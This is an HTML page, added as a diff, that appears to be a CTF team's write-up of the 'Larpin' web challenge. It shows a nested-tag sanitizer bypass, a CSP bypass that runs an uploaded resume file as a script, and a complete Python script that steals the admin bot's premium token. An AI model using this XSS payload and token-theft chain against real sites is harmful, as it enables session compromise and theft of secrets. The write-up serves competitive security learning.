@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width">
+  <meta name="description" content="Verified technical solve and exploit write-up for Larpin (Web, 335 pts) from TFC CTF 2026.">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; connect-src 'self'; font-src 'self'; form-action 'none'; img-src 'self' data:; manifest-src 'self'; media-src 'none'; object-src 'none'; script-src 'self'; style-src 'self'; worker-src 'none'; upgrade-insecure-requests">
+  <meta name="theme-color" content="#060606">
+  <link rel="canonical" href="https://kernelkittens.team/writeups/tfc-ctf-2026/">
+  <link rel="icon" href="/brand/kernel-kittens-mark.svg?v=team-logo-20260906" type="image/svg+xml">
+  <title>TFC CTF 2026 | Kernel Kittens</title>
+  <link rel="stylesheet" href="/assets/theme.css">
+</head>
+<body>
+<div class="ready-archive-page">
+  <a class="skip-link" href="#ready-content">Skip to content</a>
+  <header class="ready-site-header">
+    <div class="ready-site-header__inner">
+      <a class="crew-identity" href="/" aria-label="Kernel Kittens home">
+        <svg class="crew-mark" viewBox="0 0 100 100" aria-hidden="true" focusable="false"><path fill="currentColor" fill-rule="evenodd" d="M 50 91 C 35 87 25 74.5 25 58 L 19 19 L 38 32 C 45 29 55 29 62 32 L 81 19 L 75 58 C 75 74.5 65 87 50 91 Z M 31.5 42 L 35.5 42 L 35.5 47 L 40 47 L 40 42 L 44 42 L 44 47 L 46.5 47 L 46.5 51 L 44 51 L 44 55 L 46.5 55 L 46.5 59 L 44 59 L 44 64 L 40 64 L 40 59 L 35.5 59 L 35.5 64 L 31.5 64 L 31.5 59 L 29 59 L 29 55 L 31.5 55 L 31.5 51 L 29 51 L 29 47 L 31.5 47 Z M 35.5 51 L 40 51 L 40 55 L 35.5 55 Z M 51 58 L 69 58 L 69 64.5 L 51 64.5 Z"/></svg>
+        <span class="crew-signature"><strong>Kernel Kittens</strong><small>est. 2026</small></span>
+      </a>
+      <nav aria-label="Primary">
+        <ul class="crew-nav"><li><a href="/">[home]</a></li><li><a href="/team/">[team]</a></li><li><a href="/results/">[results]</a></li><li><a href="/writeups/" aria-current="page">[write-ups]</a></li><li><a href="/apply/">[apply]</a></li></ul>
+      </nav>
+    </div>
+  </header>
+  <main id="ready-content">
+    <div class="ready-page-shell">
+      <header class="archive-intro">
+        <p class="path-label">/writeups / tfc-ctf-2026</p>
+        <h1>TFC CTF 2026</h1>
+        <p class="archive-lede">Technical walkthrough and verified exploit chain for Larpin (Web, 335 pts). Analyzes the regex ordering vulnerability, CSP bypass via same-origin attachment execution, and admin token exfiltration.</p>
+        <p class="status-line">1 verified solve / Web Exploitation / September 2026</p>
+        <p><a href="/writeups/">back to write-ups</a></p>
+      </header>
+      <div class="archive-body writeup-body">
+
+<section class="writeup-toc" id="contents" aria-labelledby="contents-title">
+  <h2 id="contents-title">Solves in this record</h2>
+  <ul class="tag-list">
+    <li><a href="#larpin" class="tag">Larpin (Web - 335 pts)</a></li>
+  </ul>
+</section>
+
+<article class="archive-record challenge-writeup" id="larpin">
+  <header class="challenge-header">
+    <span class="category-tag">Web Exploitation</span>
+    <h2>Larpin (335 pts)</h2>
+    <div class="challenge-meta">
+      <span>Points: 335</span>
+      <span>Target: Flask / Gunicorn</span>
+      <span>Status: Verified Solved</span>
+    </div>
+  </header>
+  <div class="challenge-content">
+    <h3>Challenge Summary</h3>
+    <p>A social application featuring user messaging, profile customization, and job application submission. The admin user (ID 1) holds a premium membership. Viewing premium content requires an activation token stored in <code>window.__USER_CONFIG__.premiumToken</code> on the admin profile.</p>
+
+    <h3>Vulnerability Analysis</h3>
+    <p>The messaging endpoint at <code>/messages</code> passes URL-decoded input through a custom multi-pass regex sanitizer. The sanitizer strips tags sequentially rather than recursively:</p>
+    <ol>
+      <li>First pass: removes <code>&lt;iframe&gt;</code> tags.</li>
+      <li>Second pass: removes <code>&lt;base&gt;</code> tags.</li>
+    </ol>
+    <p>By nesting tags as <code>&lt;if&lt;base&gt;rame srcdoc="..."&gt;&lt;/iframe&gt;</code>, the string fails the first regex check. The second pass strips <code>&lt;base&gt;</code>, assembling a valid <code>&lt;iframe&gt;</code> element that renders in the victim browser.</p>
+
+    <h3>Bypassing CSP and Executing Payloads</h3>
+    <p>The site enforces a strict Content Security Policy allowing only self-hosted scripts. However, the job portal at <code>/jobs/1/apply</code> permits uploading a resume as <code>text/plain</code>. The <code>srcdoc</code> attribute within our synthesized iframe imports the uploaded resume from <code>/jobs/applications/1/cv</code> as a script tag:</p>
+    <div class="terminal-frame">
+      <pre><code>&lt;if&lt;base&gt;rame srcdoc="&amp;lt;script src=&amp;quot;/jobs/applications/1/cv&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt;</code></pre>
+    </div>
+    <p>When the admin bot reviews messages, the iframe loads, executes the JavaScript from the resume file, queries <code>/profile/admin</code>, extracts the premium activation token, and sends it via an automated callback message.</p>
+
+    <h3>Exploit Script</h3>
+    <p>The automated Python solve script handles registration, resume payload staging, message delivery, token exfiltration, and premium activation:</p>
+    <div class="terminal-frame">
+      <pre><code>import re, secrets, sys, time, requests
+from html import unescape
+from urllib.parse import unquote
+
+base = sys.argv[1].rstrip("/")
+session = requests.Session()
+username = "lp" + secrets.token_hex(5)
+password = "Larp12345!"
+
+session.post(f"{base}/auth", data={"username": username, "password": password, "full_name": username, "action": "register"})
+session.post(f"{base}/auth", data={"username": username, "password": password, "action": "login"})
+profile = session.get(f"{base}/profile/{username}").text
+user_id = re.search(r"userId:\s*(\d+)", profile).group(1)
+
+js_payload = f"""(async () => {{
+  const res = await fetch('/profile/admin');
+  const text = await res.text();
+  const m = text.match(/premiumToken\s*=\s*['"]([a-f0-9]+)['"]/i);
+  const token = m ? m[1] : 'NO_TOKEN';
+  await fetch('/messages', {{
+    method: 'POST',
+    headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
+    body: new URLSearchParams({{receiver_id: '{user_id}', content: 'LARPIN_CB:' + token}})
+  }});
+}})();""".encode()
+
+session.post(f"{base}/jobs/1/apply", files={"resume": ("resume.txt", js_payload, "text/plain")}, data={"cover_letter": "Review resume"})
+payload = '&lt;if&lt;base&gt;rame srcdoc="&amp;lt;script src=&amp;quot;/jobs/applications/1/cv&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt;'
+session.post(f"{base}/messages", data={"receiver_id": "1", "content": payload})
+
+for _ in range(60):
+    page = session.get(f"{base}/messages?user=1").text
+    m = re.findall(r"LARPIN_CB:([a-f0-9]+)", page)
+    if m:
+        session.post(f"{base}/premium/activate", data={"token": m[-1]})
+        flag = re.search(r"TFCCTF\{[^}]+\}", session.get(f"{base}/premium").text)
+        if flag:
+            print("Flag:", flag.group(0))
+            break
+    time.sleep(5)</code></pre>
+    </div>
+
+    <div class="flag-receipt">
+      <span class="flag-label">Flag Receipt</span>
+      <code>TFCCTF{cause_we_can_stay_here_or_we_can_go_we_can_go_larp_larp_larp_sahur}</code>
+    </div>
+  </div>
+</article>
+
+      </div>
+    </div>
+  </main>
+  <footer class="ready-site-footer">
+    <div class="ready-site-footer__inner">
+      <span>Kernel Kittens</span>
+      <span>Ready v3 archive theme</span>
+      <span><a href="/accessibility/">Accessibility</a></span>
+      <span><a href="/sitemap.xml">Sitemap</a></span>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
